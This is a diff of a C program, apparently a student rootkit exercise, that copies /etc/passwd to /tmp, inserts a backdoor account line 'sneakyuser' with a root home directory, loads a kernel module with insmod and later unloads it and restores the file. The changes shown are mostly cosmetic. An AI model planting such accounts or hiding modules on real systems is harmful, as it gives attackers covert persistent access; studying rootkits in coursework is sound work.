@@ -2,12 +2,13 @@
 #include <stdio.h>
 #include <sys/types.h>
 #include <unistd.h>
+#include <string.h>
 #include <sys/wait.h>
 
 
-const char * line = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
-const char * src = "/etc/passwd";
-const char * destination = "/tmp/passwd";
+char * line = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
+char * src = "/etc/passwd";
+char * destination = "/tmp/passwd";
 
 
 
@@ -86,7 +87,7 @@ void load_module(){
 
 
 
-void copy_file(char * src, char * destination){
+void copy_file(char * src,  char * destination){
 
 
   //char * command = "cp";
@@ -154,13 +155,14 @@ int main(){
 
   //First malicious act. Copy /etc/passwd file to a new file: /tmp/passwd
   copy_file(src, destination);
+
   //Load the sneaky module using the insmod command
   load_module();
 
   //Enter a loop when the module is being uploaded
   loop();
 
-  //Exit from the loop suggests removing the moduele using rmmod
+  //Exit from the loop suggests removing the module using rmmod
   unload_module();
 
   //Restore the original file
